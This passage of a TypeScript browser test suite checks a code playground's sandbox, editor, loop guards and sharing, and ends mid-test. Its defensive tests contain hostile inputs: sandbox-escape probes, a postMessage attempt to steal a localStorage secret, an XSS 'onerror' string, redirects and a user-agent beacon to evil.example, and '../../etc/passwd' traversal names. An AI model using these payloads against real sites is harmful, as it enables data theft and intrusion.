import axe from 'axe-core';
import type { Browser, HTTPRequest, Page } from 'puppeteer-core';
import { afterAll, beforeAll, describe, expect, test } from 'vitest';
import { findChrome, launchChrome } from './chrome.ts';
import { encodeProject } from '../src/share.ts';
import { consoleEntries, errorsOf, openPlayground, previewFrame, runNumber, setCode, startServer, waitForConsole, waitForNewRun } from './support.ts';

let browser: Browser;
let server: Awaited<ReturnType<typeof startServer>>;
const base = () => server.url;

beforeAll(async () => {
    if (!findChrome()) throw new Error('No Chrome or Edge found. Set CHROME_PATH.');
    server = await startServer();
    browser = await launchChrome();
});

afterAll(async () => {
    await browser?.close();
    await server?.close();
});

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

/**
 * Watch for anything the browser tries to send to a host that is not the playground itself. Every such
 * request is answered with a 404, and listed: a request a content security policy blocks never reaches
 * this point, so an empty list means nothing could have left the machine.
 */
async function outsideRequests(page: Page): Promise<string[]> {
    const sent: string[] = [];
    await page.setRequestInterception(true);
    page.on('request', (r: HTTPRequest) => {
        const url = r.url();
        if (/^https?:\/\/(127\.0\.0\.1|localhost)/.test(url) || /^(blob|data|about):/.test(url)) void r.continue();
        else {
            sent.push(url);
            void r.respond({ status: 404, body: 'no' });
        }
    });
    return sent;
}
const text = (page: Page, selector: string) => page.$eval(selector, (el) => el.textContent ?? '');

/** Edit a file and wait for the preview to be rebuilt as a fresh page. */
async function edit(page: Page, name: string, code: string): Promise<number> {
    const before = await runNumber(page);
    await setCode(page, name, code);
    return waitForNewRun(page, before);
}

describe('it runs, and edits show up', () => {
    test('the first template runs: the page is shown, its script logs, and clicks work inside the sandbox', async () => {
        const page = await openPlayground(browser, base());
        const frame = await previewFrame(page);
        expect(await frame.$eval('h1', (el) => el.textContent)).toBe('Hello');
        await waitForConsole(page, (e) => e.some((x) => x.text === 'ready'));
        await frame.click('#button');
        await frame.click('#button');
        expect(await frame.$eval('#count', (el) => el.textContent)).toBe('2');
        await waitForConsole(page, (e) => e.some((x) => x.text === 'clicked 2'));
        expect(errorsOf(page)).toEqual([]);
    });

    test('typing real keystrokes into the CSS updates the page without reloading it: state survives', async () => {
        const page = await openPlayground(browser, base());
        let frame = await previewFrame(page);
        for (let i = 0; i < 3; i++) await frame.click('#button');
        const run = await runNumber(page);

        await page.click('[role=tab][data-name="style.css"]');
        await page.click('.cm-content');
        await page.keyboard.down('Control');
        await page.keyboard.press('a');
        await page.keyboard.up('Control');
        await page.keyboard.type('body{background:#123456}');

        frame = await previewFrame(page);
        await frame.waitForFunction(() => getComputedStyle(document.body).backgroundColor === 'rgb(18, 52, 86)', { timeout: 10_000 });
        expect(await frame.$eval('#count', (el) => el.textContent)).toBe('3'); // the page was not reloaded
        expect(await runNumber(page)).toBe(run);
        expect(await text(page, '#status')).toMatch(/Styles updated without reloading/);
    });

    test('a change to the script rebuilds the page, which starts again and logs afresh', async () => {
        const page = await openPlayground(browser, base());
        let frame = await previewFrame(page);
        await frame.click('#button');
        await edit(page, 'main.js', `document.querySelector('#count').textContent = 'fresh'; console.log('second run');`);
        frame = await previewFrame(page);
        expect(await frame.$eval('#count', (el) => el.textContent)).toBe('fresh');
        const entries = await waitForConsole(page, (e) => e.some((x) => x.text === 'second run'));
        expect(entries.map((e) => e.text)).toEqual(['second run']); // the first run's output was cleared
    });

    test('a change to the HTML rebuilds the page too', async () => {
        const page = await openPlayground(browser, base());
        await edit(page, 'index.html', '<!doctype html><html><body><h1 id="t">New page</h1></body></html>');
        const frame = await previewFrame(page);
        expect(await frame.$eval('#t', (el) => el.textContent)).toBe('New page');
    });

    test('a reload keeps the scroll position', async () => {
        const page = await openPlayground(browser, base());
        await edit(page, 'index.html', '<!doctype html><html><body style="margin:0"><div style="height:4000px">tall</div></body></html>');
        let frame = await previewFrame(page);
        await frame.evaluate(() => window.scrollTo(0, 900));
        await sleep(400); // the page reports its scroll position a moment after it settles
        await edit(page, 'main.js', 'console.log("again");');
        frame = await previewFrame(page);
        await frame.waitForFunction(() => Math.round(window.scrollY) === 900, { timeout: 10_000 });
    });

    test('Ctrl+Enter inside the editor runs again from scratch', async () => {
        const page = await openPlayground(browser, base());
        const before = await runNumber(page);
        await page.click('.cm-content');
        await page.keyboard.down('Control');
        await page.keyboard.press('Enter');
        await page.keyboard.up('Control');
        expect(await waitForNewRun(page, before)).toBe(before + 1);
    });

    test('with auto-run off nothing runs until Run is pressed', async () => {
        const page = await openPlayground(browser, base());
        await page.click('#auto');
        const before = await runNumber(page);
        await setCode(page, 'main.js', 'console.log("manual");');
        await sleep(900);
        expect(await runNumber(page)).toBe(before);
        await page.click('#run');
        await waitForNewRun(page, before);
        await waitForConsole(page, (e) => e.some((x) => x.text === 'manual'));
    });
});

describe('mistakes', () => {
    test('a syntax error is underlined in the editor and listed in the console, and the working page stays', async () => {
        const page = await openPlayground(browser, base());
        const run = await runNumber(page);
        await setCode(page, 'main.js', `const ok = 1;\nconst broken = ;\n`);
        await waitForConsole(page, (e) => e.some((x) => x.level === 'error'));
        const [error] = (await consoleEntries(page)).filter((x) => x.level === 'error');
        expect(error!.where).toMatch(/^main\.js:2:/);
        await page.waitForSelector('.cm-lintRange-error');
        expect(await runNumber(page)).toBe(run); // the last good page is still there
        const frame = await previewFrame(page);
        expect(await frame.$eval('h1', (el) => el.textContent)).toBe('Hello');
        expect(await text(page, '#status')).toMatch(/Build failed: 1 error/);

        await edit(page, 'main.js', 'console.log("fixed");');
        expect(await page.$('.cm-lintRange-error')).toBeNull();
        await waitForConsole(page, (e) => e.some((x) => x.text === 'fixed'));
    });

    test('a runtime error is mapped back to the line the person wrote, through bundling and loop guards', async () => {
        const page = await openPlayground(browser, base());
        await edit(
            page,
            'main.js',
            `// line 1
const items = [1, 2, 3];
let total = 0;
for (const n of items) total += n;
function explode() {
    throw new TypeError('kaboom ' + total);
}
explode();
`,
        );
        const entries = await waitForConsole(page, (e) => e.some((x) => x.level === 'error' && /kaboom/.test(x.text)));
        const error = entries.find((x) => x.level === 'error')!;
        expect(error.text).toBe('TypeError: kaboom 6');
        expect(error.where).toMatch(/^main\.js:6:/); // the throw is on line 6 of what they typed
        await page.waitForSelector('.cm-lintRange-error');
        // The stack the person can open says their own file, not "bundle.js".
        const stack = await page.$eval('#console-log .l-error details pre', (el) => el.textContent ?? '');
        expect(stack).toContain('main.js:6:');
        expect(stack).not.toContain('bundle.js');
        // Clicking the location takes them there.
        await page.click('#console-log .where');
        await page.waitForFunction(() => {
            const pg = (window as unknown as { __pg: { editor: { view: { state: { doc: { lineAt(n: number): { number: number }; length: number }; selection: { main: { head: number } } } } } } }).__pg;
            return pg.editor.view.state.doc.lineAt(pg.editor.view.state.selection.main.head).number === 6;
        });
    });

    test('an unhandled promise rejection and an error in a callback are reported too', async () => {
        const page = await openPlayground(browser, base());
        await edit(page, 'main.js', `Promise.reject(new Error('rejected'));\nsetTimeout(() => { null.x; }, 10);`);
        const entries = await waitForConsole(page, (e) => e.some((x) => /rejected/.test(x.text)) && e.some((x) => /Cannot read properties of null/.test(x.text)));
        expect(entries.filter((x) => x.level === 'error').length).toBeGreaterThanOrEqual(2);
    });

    test('an import that cannot be found says what to do', async () => {
        const page = await openPlayground(browser, base());
        await setCode(page, 'main.js', `import { x } from './missing';\nconsole.log(x);`);
        const entries = await waitForConsole(page, (e) => e.some((x) => x.level === 'error'));
        expect(entries.find((x) => x.level === 'error')!.text).toMatch(/Could not find \.\/missing/);
    });
});

describe('the sandbox', () => {
    const probe = `
const out = {};
const attempt = (name, fn) => { try { const v = fn(); out[name] = v === undefined ? 'undefined' : String(v); } catch (e) { out[name] = e.name; } };
attempt('parentDocument', () => parent.document.title);
attempt('parentGlobals', () => parent.__pg);
attempt('topLocation', () => top.location.href);
attempt('localStorage', () => localStorage.getItem('playground:v1'));
attempt('sessionStorage', () => sessionStorage.length);
attempt('cookie', () => document.cookie);
attempt('indexedDB', () => indexedDB.open('x') && 'opened');
attempt('origin', () => window.origin);
attempt('popup', () => window.open('https://example.com/') === null ? 'blocked' : 'opened');
attempt('navigateTop', () => { top.location = 'https://example.com/'; });
attempt('formSubmit', () => { const f = document.createElement('form'); f.action = 'https://example.com/'; document.body.append(f); f.submit(); return 'tried'; });
try { await fetch('https://example.com/'); out.fetchOk = 'fetched'; } catch (e) { out.fetchOk = e.name; }
console.log(JSON.stringify(out));
`;

    test('code in the preview cannot reach the playground, its storage, or the outside world', async () => {
        const page = await openPlayground(browser, base());
        const sent = await outsideRequests(page);
        await page.evaluate(() => localStorage.setItem('secret', 'do-not-leak'));
        await edit(page, 'main.js', probe);
        const entries = await waitForConsole(page, (e) => e.some((x) => x.text.startsWith('{')));
        const out = JSON.parse(entries.find((x) => x.text.startsWith('{'))!.text) as Record<string, string>;
        expect(out.parentDocument).toBe('SecurityError');
        expect(out.parentGlobals).toBe('SecurityError');
        expect(out.topLocation).toBe('SecurityError');
        expect(out.localStorage).toBe('SecurityError');
        expect(out.sessionStorage).toBe('SecurityError');
        expect(out.cookie).toBe('SecurityError');
        expect(out.indexedDB).toBe('SecurityError');
        expect(out.origin).toBe('null'); // no origin of its own to share
        expect(out.popup).toBe('blocked');
        expect(out.fetchOk).toBe('TypeError'); // connect-src 'none'
        await sleep(500);
        expect(page.url()).toMatch(/localhost|127\.0\.0\.1/); // it did not navigate the playground away
        expect(sent).toEqual([]); // not the fetch, the popup, the top navigation or the form
        expect(await page.evaluate(() => localStorage.getItem('secret'))).toBe('do-not-leak');
    });

    test('the sandbox page cannot be used outside the sandbox: not opened directly, and not embedded by another page without the sandbox attribute', async () => {
        const page = await openPlayground(browser, base());
        await page.evaluate(() => localStorage.setItem('secret', 'do-not-leak'));

        // Embedded without `sandbox`, the page would share the playground's origin. Whoever embeds it can post to it.
        const stolen = await page.evaluate(
            () =>
                new Promise<string>((resolve) => {
                    const frame = document.createElement('iframe');
                    frame.id = 'attacker-frame';
                    frame.src = 'sandbox.html';
                    window.addEventListener('message', (e) => e.source === frame.contentWindow && resolve(String(e.data?.text ?? e.data?.t ?? e.data)));
                    frame.addEventListener('load', () => {
                        frame.contentWindow!.postMessage({ t: 'run', run: 1, html: '<p id="pwned">x</p>', css: '', code: 'localStorage.setItem("pwned", "1"); console.log("STOLEN:" + localStorage.getItem("secret"));' }, '*');
                        setTimeout(() => resolve('nothing happened'), 1500);
                    });
                    document.body.append(frame);
                }),
        );
        expect(stolen).toBe('nothing happened'); // not even "ready" came back, and no log with the secret
        expect(await page.evaluate(() => localStorage.getItem('pwned'))).toBeNull();
        const inside = await page.$eval('#attacker-frame', (f) => (f as HTMLIFrameElement).contentDocument!.body.textContent);
        expect(inside).toMatch(/only runs inside the playground/);

        // Opened directly as a page of its own, it refuses too.
        await page.goto(`${base()}/sandbox.html`);
        expect(await page.$eval('body', (b) => b.textContent)).toMatch(/only runs inside the playground/);
        await page.goto(`${base()}/sandbox-net.html`);
        expect(await page.$eval('body', (b) => b.textContent)).toMatch(/only runs inside the playground/);
    });

    test('inline scripts, event-handler attributes and javascript: links never run, and the console says why', async () => {
        const page = await openPlayground(browser, base());
        await edit(
            page,
            'index.html',
            `<!doctype html><html><body>
<button id="b" onclick="console.log('INLINE HANDLER RAN')">x</button>
<a id="a" href="javascript:console.log('JS URL RAN')">y</a>
<script>console.log('INLINE SCRIPT RAN')</script>
<img src=x onerror="console.log('ONERROR RAN')">
</body></html>`,
        );
        const frame = await previewFrame(page);
        await frame.click('#b');
        await frame.click('#a').catch(() => {});
        const entries = await waitForConsole(page, (e) => e.filter((x) => x.level === 'system').length >= 1);
        await sleep(300);
        const all = (await consoleEntries(page)).map((x) => x.text).join('\n');
        expect(all).not.toMatch(/RAN/);
        expect(all).toMatch(/inline script or event-handler attribute/);
        expect(entries.some((x) => x.level === 'system')).toBe(true);
    });

    test('with the network off, nothing outside is requested: not images, not styles, not scripts, not fetch', async () => {
        const page = await openPlayground(browser, base());
        const sent = await outsideRequests(page);
        await edit(
            page,
            'index.html',
            `<!doctype html><html><head><link rel="stylesheet" href="https://example.com/a.css"><script src="https://example.com/a.js"></script></head><body><img src="https://example.com/a.png"><iframe src="https://example.com/"></iframe></body></html>`,
        );
        await waitForConsole(page, (e) => e.some((x) => x.level === 'system'));
        await sleep(500);
        expect(sent).toEqual([]);
        expect((await consoleEntries(page)).some((x) => /Allow network/.test(x.text))).toBe(true);
    });

    test('a hostile page cannot make the playground do anything by posting messages: forged ones are ignored or only land in the console as text', async () => {
        const page = await openPlayground(browser, base());
        await edit(
            page,
            'main.js',
            `parent.postMessage({ t: 'log', run: 1, level: 'error', group: 0, text: '<img src=x onerror=window.__pwned=1>' }, '*');
parent.postMessage({ t: 'ready' }, '*');
parent.postMessage({ t: 'run', html: '<script>evil</script>' }, '*');
parent.postMessage('not even an object', '*');
parent.postMessage({ t: 'error', run: 1, message: 'm', file: 'bundle.js', line: 0, column: 0, stack: 'at bundle.js:0:0\\nat bundle.js:99999999:1' }, '*');
console.log('done');`,
        );
        await waitForConsole(page, (e) => e.some((x) => x.text === 'done'));
        expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
        expect(await page.$$eval('#console-log img', (els) => els.length)).toBe(0);
        expect(errorsOf(page)).toEqual([]); // nothing threw inside the playground
        // And the playground still works afterwards.
        await edit(page, 'main.js', 'console.log("still fine");');
        await waitForConsole(page, (e) => e.some((x) => x.text === 'still fine'));
    });
});

describe('what a hostile project can still try (found by the second review)', () => {
    test('a preview that navigates itself to another site is taken down and the playground says so, whichever way it does it', async () => {
        const attempts: [string, { html?: string; main?: string }][] = [
            ['location.href', { main: `location.href = 'https://evil.example/beacon?a';` }],
            ['location.replace', { main: `location.replace('https://evil.example/beacon?b');` }],
            ['a click on a link', { main: `const a = document.createElement('a'); a.href = 'https://evil.example/beacon?c'; document.body.append(a); a.click();` }],
            ['a meta refresh', { html: '<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example/beacon?d"></head><body><p id="stay">still here</p></body></html>' }],
        ];
        for (const [label, change] of attempts) {
            const page = await openPlayground(browser, base());
            if (change.html) await edit(page, 'index.html', change.html);
            else await edit(page, 'main.js', change.main!);
            await waitForConsole(page, (e) => e.some((x) => /tried to navigate away/.test(x.text)), 10_000);
            await page.waitForFunction(() => document.querySelectorAll('#preview-host iframe').length === 0);
            expect(await text(page, '#status'), label).toMatch(/tried to navigate away/);
            // And the playground carries on: a fix runs in a fresh frame.
            await edit(page, 'main.js', `console.log('back to normal');`);
            await waitForConsole(page, (e) => e.some((x) => x.text === 'back to normal'));
            expect(await page.$$('#preview-host iframe'), label).toHaveLength(1);
        }
    });

    test('a link cannot switch the network on, and unticking the box on a link project does not run it', async () => {
        const hash = `#${await encodeProject({ network: true, files: [{ name: 'index.html', code: '<p>x</p>' }, { name: 'main.js', code: 'new Image().src = "https://evil.example/?ua=" + navigator.userAgent;' }] })}`;
        const page = await openPlayground(browser, base(), { hash, waitForPreview: false });
        await page.waitForFunction(() => (window as unknown as { __pg: { fromLink: boolean } }).__pg.fromLink === true);
        expect(await page.$eval('#network', (el) => (el as HTMLInputElement).checked)).toBe(false);
        expect(await page.evaluate(() => (window as unknown as { __pg: { project: { network: boolean } } }).__pg.project.network)).toBe(false);

        await page.click('#network'); // tick it
        await page.click('#network'); // and untick it again
        await sleep(700);
        expect(await page.$$('#preview-host iframe')).toHaveLength(0); // neither toggle ran the code
        expect(await text(page, '#notice')).toMatch(/came from a link/);

        const sent = await outsideRequests(page);
        await page.click('#run-shared');
        await page.waitForSelector('#preview-host iframe');
        await sleep(800);
        expect((await previewFrame(page)).url()).toMatch(/sandbox\.html$/); // the page without network access
        expect(sent).toEqual([]);
    });

    test('a project that did not finish starting last time is not run automatically this time', async () => {
        const page = await openPlayground(browser, base(), { storage: { 'playground:booting': String(Date.now()) }, waitForPreview: false });
        await page.waitForFunction(() => (window as unknown as { __pg?: { project: unknown } }).__pg?.project !== undefined);
        await sleep(1000);
        expect(await page.$$('#preview-host iframe')).toHaveLength(0);
        expect(await text(page, '#message')).toMatch(/did not finish starting/);
        await page.click('#run'); // the person chooses to try again
        await page.waitForFunction(() => (window as unknown as { __pg: { previewHandle: { live: boolean } } }).__pg.previewHandle.live);
    });

    test('the marker that guards the next start is set while starting and gone shortly after, when all is well', async () => {
        const page = await openPlayground(browser, base());
        expect(await page.evaluate(() => localStorage.getItem('playground:booting'))).not.toBeNull();
        await page.waitForFunction(() => localStorage.getItem('playground:booting') === null, { timeout: 12_000 });
    });

    test('a preview that floods the playground with forged messages is cut off, and the playground stays responsive', async () => {
        const page = await openPlayground(browser, base());
        const next = (await runNumber(page)) + 1;
        const started = Date.now();
        await edit(page, 'main.js', `const big = 'x'.repeat(2000);\nfor (let i = 0; i < 60000; i++) parent.postMessage({ t: 'log', run: ${next}, level: 'log', group: 0, text: big }, '*');\nconsole.log('flooded');`);
        await sleep(2500);
        await Promise.race([page.evaluate(() => 1), sleep(4000).then(() => Promise.reject(new Error('the playground stopped responding')))]);
        const shown = await page.$$eval('#console-log .entry', (rows) => rows.length);
        expect(shown).toBeLessThanOrEqual(1001);
        expect(Date.now() - started).toBeLessThan(30_000);
    });

    test('the playground refuses to run inside another page, so a link\'s Run button cannot be clicked from under a decoy', async () => {
        const page = await openPlayground(browser, base());
        const inside = await page.evaluate(
            (src: string) =>
                new Promise<string>((resolve) => {
                    const frame = document.createElement('iframe');
                    frame.id = 'decoy';
                    frame.addEventListener('load', () => setTimeout(() => resolve(frame.contentDocument!.body.textContent ?? ''), 500));
                    frame.src = src;
                    document.body.append(frame);
                }),
            `${base()}/?e2e=1`,
        );
        expect(inside).toMatch(/cannot be shown inside another page/);
        expect(await page.$eval('#decoy', (f) => (f as HTMLIFrameElement).contentDocument!.querySelector('#run'))).toBeNull();
    });
});

describe('infinite loops', () => {
    async function responsive(page: Page, within = 1500): Promise<void> {
        await Promise.race([page.evaluate(() => 1), sleep(within).then(() => Promise.reject(new Error('the playground stopped responding')))]);
    }

    test('while(true) is stopped after about two seconds, the error points at the loop, and the page stays alive', async () => {
        const page = await openPlayground(browser, base());
        const started = Date.now();
        await edit(page, 'main.js', `console.log('before');\nwhile (true) {\n}\nconsole.log('never');`);
        const entries = await waitForConsole(page, (e) => e.some((x) => /Stopped a loop/.test(x.text)), 20_000);
        const took = Date.now() - started;
        expect(took).toBeGreaterThan(1800);
        expect(took).toBeLessThan(9000);
        const stop = entries.find((x) => /Stopped a loop/.test(x.text))!;
        expect(stop.level).toBe('error');
        expect(stop.where).toMatch(/^main\.js:2:/);
        expect(entries.map((x) => x.text)).not.toContain('never');
        await responsive(page);
        // And a fix runs straight away.
        await edit(page, 'main.js', 'console.log("recovered");');
        await waitForConsole(page, (e) => e.some((x) => x.text === 'recovered'));
    });

    test.each([
        ['for(;;)', 'for (;;) {}'],
        ['do-while', 'do {} while (true);'],
        ['an unbraced loop', 'while (true);'],
        ['a nested loop', 'for (let i = 0; i < 3; i++) { for (;;) { } }'],
        ['a for-of over an endless generator', 'function* g() { while (true) yield 1; } for (const x of g()) {}'],
        ['a second loop after one whose error was caught', 'try { while (true) {} } catch (e) {} while (true) {}'],
        ['a loop in a timer callback', 'setTimeout(() => { while (true) {} }, 20);'],
        ['a loop in a module the person imported', 'import "./spin.js";'],
        ['an async loop that never yields to the event loop', '(async () => { while (true) { await null; } })();'],
    ])('%s', async (_label, code) => {
        const page = await openPlayground(browser, base());
        await page.evaluate(() => (document.querySelector('[role=tab][data-name="main.js"]') as HTMLElement).click());
        // A second file for the "imported module" case.
        if (code.includes('./spin.js')) {
            await page.click('button[aria-label="New file"]');
            await page.$eval('#file-name', (el) => ((el as HTMLInputElement).value = 'spin.js'));
            await page.keyboard.press('Enter');
            await setCode(page, 'spin.js', 'while (true) {}');
        }
        await edit(page, 'main.js', code);
        await waitForConsole(page, (e) => e.some((x) => /Stopped a loop/.test(x.text)), 20_000);
        await responsive(page);
    });

    test('a long loop that does finish is left alone', async () => {
        const page = await openPlayground(browser, base());
        await edit(page, 'main.js', `let s = 0; for (let i = 0; i < 30_000_000; i++) { s += i % 7; } console.log('sum', s);`);
        const entries = await waitForConsole(page, (e) => e.some((x) => /^sum /.test(x.text) || /Stopped a loop/.test(x.text)), 20_000);
        expect(entries.some((x) => /Stopped a loop/.test(x.text))).toBe(false);
        expect(entries.some((x) => /^sum /.test(x.text))).toBe(true);
    });

    test('loops inside bundled Preact are not instrumented: a big render stays fast and unflagged', async () => {
        const page = await openPlayground(browser, base());
        await edit(page, 'index.html', '<!doctype html><html><body><div id="app"></div></body></html>');
        await edit(
            page,
            'main.js',
            `import { h, render } from 'preact';
const rows = Array.from({ length: 5000 }, (_, i) => h('li', { key: i }, 'row ' + i));
const t0 = performance.now();
render(h('ul', null, rows), document.getElementById('app'));
console.log('rendered', document.querySelectorAll('li').length, 'in', Math.round(performance.now() - t0), 'ms');`,
        );
        const entries = await waitForConsole(page, (e) => e.some((x) => /^rendered/.test(x.text)), 20_000);
        expect(entries.find((x) => /^rendered/.test(x.text))!.text).toMatch(/rendered 5000 in \d+ ms/);
    });
});

describe('TypeScript, JSX, imports and packages', () => {
    async function choose(page: Page, id: string) {
        const before = await runNumber(page);
        await page.select('#template', id);
        await waitForNewRun(page, before);
    }

    test('the Preact template compiles in the browser and works, and loads nothing from the network', async () => {
        const page = await openPlayground(browser, base());
        const external: string[] = [];
        page.on('request', (r) => !r.url().startsWith(base()) && !r.url().startsWith('blob:') && !r.url().startsWith('data:') && !r.url().startsWith('about:') && external.push(r.url()));
        await choose(page, 'preact');
        const frame = await previewFrame(page);
        expect(await frame.$eval('h1', (el) => el.textContent)).toBe('Hello from Preact');
        await frame.click('button');
        await frame.click('button');
        await frame.waitForFunction(() => document.querySelector('p')!.textContent === 'State: 2. Signal: 2.');
        expect(external).toEqual([]);
        expect((await consoleEntries(page)).filter((e) => e.level === 'error')).toEqual([]);
    });

    test('the TypeScript template: types are erased and a relative import works', async () => {
        const page = await openPlayground(browser, base());
        await choose(page, 'typescript');
        const frame = await previewFrame(page);
        await frame.type('#text', 'write tests');
        await frame.click('form button');
        expect(await frame.$$eval('#list li', (els) => els.map((e) => e.textContent))).toEqual(['write tests']);
        await waitForConsole(page, (e) => e.some((x) => x.text === '0 of 1 done'));
    });

    test('a package that is not built in asks for the network, and with it on comes from esm.sh (no other host is contacted)', async () => {
        const page = await openPlayground(browser, base());
        const seen: string[] = [];
        await page.setRequestInterception(true);
        page.on('request', (r: HTTPRequest) => {
            seen.push(r.url());
            if (r.url() === 'https://esm.sh/tiny-greeting') {
                void r.respond({ status: 200, contentType: 'text/javascript', headers: { 'access-control-allow-origin': '*' }, body: `export default (n) => 'hello ' + n + ' from esm';` });
            } else if (r.url().startsWith('https://')) {
                void r.respond({ status: 404, body: 'not here' });
            } else void r.continue();
        });
        await setCode(page, 'main.js', `import greet from 'tiny-greeting';\nconsole.log(greet('Ada'));`);
        const off = await waitForConsole(page, (e) => e.some((x) => x.level === 'error'));
        expect(off.find((x) => x.level === 'error')!.text).toMatch(/Cannot find package "tiny-greeting".*Allow network/);

        await page.click('#network');
        await waitForConsole(page, (e) => e.some((x) => x.text === 'hello Ada from esm'));
        expect(seen).toContain('https://esm.sh/tiny-greeting');
        expect(seen.filter((u) => u.startsWith('https://') && u !== 'https://esm.sh/tiny-greeting')).toEqual([]);
        expect(await text(page, '#notice')).toMatch(/Network is on/);
    });

    test('even with the network on, only esm.sh may supply scripts, and a script tag from elsewhere is blocked', async () => {
        const page = await openPlayground(browser, base());
        const seen: string[] = [];
        await page.setRequestInterception(true);
        page.on('request', (r: HTTPRequest) => {
            seen.push(r.url());
            if (r.url().startsWith('https://')) void r.respond({ status: 200, contentType: 'text/javascript', headers: { 'access-control-allow-origin': '*' }, body: 'console.log("LOADED " + document.currentScript)' });
            else void r.continue();
        });
        await page.click('#network');
        await edit(page, 'index.html', '<!doctype html><html><head><script src="https://evil.example/x.js"></script></head><body></body></html>');
        await waitForConsole(page, (e) => e.some((x) => x.level === 'system'));
        await sleep(400);
        expect(seen.some((u) => u.startsWith('https://evil.example'))).toBe(false);
        await setCode(page, 'main.js', `import x from 'https://evil.example/mod.js';\nconsole.log(x);`);
        const entries = await waitForConsole(page, (e) => e.some((x) => x.level === 'error' && /Only https:\/\/esm\.sh/.test(x.text)));
        expect(entries.length).toBeGreaterThan(0);
        expect(seen.some((u) => u.startsWith('https://evil.example'))).toBe(false);
    });
});

describe('files', () => {
    test('add, open, rename and delete a file; bad names are explained; the page itself cannot be renamed or deleted', async () => {
        const page = await openPlayground(browser, base());
        const tabs = () => page.$$eval('[role=tab]', (els) => els.map((e) => e.textContent));
        expect(await tabs()).toEqual(['index.html', 'style.css', 'main.js']);

        await page.click('button[aria-label="New file"]');
        for (const bad of ['../evil.js', 'a b.js', 'x.exe', 'main.ts', 'index.html', 'style.css']) {
            await page.$eval('#file-name', (el, v) => ((el as HTMLInputElement).value = v), bad);
            await page.keyboard.press('Enter');
            expect(await text(page, '#file-name-help'), bad).not.toBe('');
        }
        await page.$eval('#file-name', (el) => ((el as HTMLInputElement).value = 'util.ts'));
        await page.keyboard.press('Enter');
        expect(await tabs()).toEqual(['index.html', 'style.css', 'main.js', 'util.ts']);
        expect(await page.$eval('[role=tab][aria-selected=true]', (e) => e.textContent)).toBe('util.ts');

        await setCode(page, 'util.ts', `export const answer: number = 42;`);
        await edit(page, 'main.js', `import { answer } from './util';\nconsole.log('answer', answer);`);
        await waitForConsole(page, (e) => e.some((x) => x.text === 'answer 42'));

        await page.click('[role=tab][data-name="util.ts"]');
        await page.click('button[aria-label="Rename util.ts"]');
        await page.$eval('#file-name', (el) => ((el as HTMLInputElement).value = 'numbers.ts'));
        await page.keyboard.press('Enter');
        expect(await tabs()).toContain('numbers.ts');

        await page.click('button[aria-label="Delete numbers.ts"]');
        expect(await tabs()).not.toContain('numbers.ts');
        await page.click('#undo-load');
        expect(await tabs()).toContain('numbers.ts');

        await page.click('[role=tab][data-name="index.html"]');
        expect(await page.$('button[aria-label^="Rename"]')).toBeNull();
        expect(await page.$('button[aria-label^="Delete"]')).toBeNull();
    });

    test('tabs follow the arrow keys, as a tab list should', async () => {
        const page = await openPlayground(browser, base());
        await page.focus('[role=tab][aria-selected=true]');
        await page.keyboard.press('ArrowRight');
        expect(await page.$eval('[role=tab][aria-selected=true]', (e) => e.textContent)).toBe('style.css');
        await page.keyboard.press('End');
        expect(await page.$eval('[role=tab][aria-selected=true]', (e) => e.textContent)).toBe('main.js');
        await page.keyboard.press('ArrowRight');
        expect(await page.$eval('[role=tab][aria-selected=true]', (e) => e.textContent)).toBe('index.html');
    });

    test('switching template replaces the project, and Undo brings the old one back', async () => {
        const page = await openPlayground(browser, base());
        await setCode(page, 'main.js', 'console.log("mine");');
        await page.select('#template', 'canvas');
        await page.waitForFunction(() => document.querySelector('[role=tab][aria-selected=true]')?.textContent === 'main.js');
        expect(await page.evaluate(() => (window as unknown as { __pg: { project: { files: { name: string; code: string }[] } } }).__pg.project.files.find((f) => f.name === 'main.js')!.code)).toContain('requestAnimationFrame');
        await page.click('#undo-load');
        await page.waitForFunction(() => (window as unknown as { __pg: { project: { files: { name: string; code: string }[] } } }).__pg.project.files.find((f) => f.name === 'main.js')!.code.includes('mine'));
    });
});

describe('saving and sharing', () => {
    test('work is saved in the browser and is there after a reload', async () => {
        const page = await openPlayground(browser, base());
        await setCode(page, 'main.js', 'console.log("remember me");');
        await sleep(900);
        // (A reload while the page is still starting counts as a crash: the project is not run again by itself.)
        await page.waitForFunction(() => localStorage.getItem('playground:booting') === null, { timeout: 12_000 });
        await page.reload();
        await page.waitForFunction(() => (window as unknown as { __pg?: { previewHandle: { live: boolean } } }).__pg?.previewHandle.live);
        await waitForConsole(page, (e) => e.some((x) => x.text === 'remember me'));
    });

    test('corrupt saved data is ignored and the playground starts normally', async () => {
        const page = await openPlayground(browser, base(), { storage: { 'playground:v1': '{"project":{"files":[{"name":"../../etc/passwd","code":"x"}]}}' } });
        expect(await page.$eval('[role=tab][aria-selected=true]', (e) => e.textContent)).toBe('index.html');
        expect(errorsOf(page)).toEqual([]);
    });

    test('with storage blocked it still works, and says that nothing is being saved', async () => {
        const page = await openPlayground(browser, base(), { blockStorage: true });
        await setCode(page, 'main.js', 'console.log("no storage");');
        await waitForConsole(page, (e) => e.some((x) => x.text === 'no storage'));
        await sleep(900);
        expect(await text(page, '#status')).toMatch(/Could not save/);
        expect(errorsOf(page).filter((e) => !/blocked/.test(e))).toEqual([]);
    });

    test('Share puts the whole project in the address bar; opening it shows the code but does not run it until you say so', async () => {
        const page = await openPlayground(browser, base());
        await setCode(page, 'main.js', 'console.log("shared code ran");');
        await sleep(600);
        await page.click('#share');
        await page.waitForFunction(() => location.hash.startsWith('#p=v1.'));
        const link = await page.evaluate(() => location.href);

        const friend = await openPlayground(browser, base(), { hash: link.slice(link.indexOf('#')), waitForPreview: false });
        await friend.waitForFunction(() => (window as unknown as { __pg: { fromLink: boolean } }).__pg.fromLink === true);
        await sleep(1200);
        expect(await friend.$$('#preview-host iframe')).toHaveLength(0); // nothing is running
        expect(await consoleEntries(friend)).toEqual([]);
        expect(await friend.evaluate(() => (window as unknown as { __pg: { project: { files: { name: string; code: string }[] } } }).__pg.project.files.find((f) => f.name === 'main.js')!.code)).toContain('shared code ran'); // but the code can be read
        expect(await friend.$eval('.cm-content', (el) => el.textContent ?? '')).toBeDefined();
        expect(await text(friend, '#notice')).toMatch(/came from a link/);

        // Typing in a shared project does not run it either.
        await setCode(friend, 'style.css', 'body{}');
        await sleep(700);
        expect(await friend.$$('#preview-host iframe')).toHaveLength(0);

        await friend.click('#run-shared');
        await waitForConsole(friend, (e) => e.some((x) => x.text === 'shared code ran'));
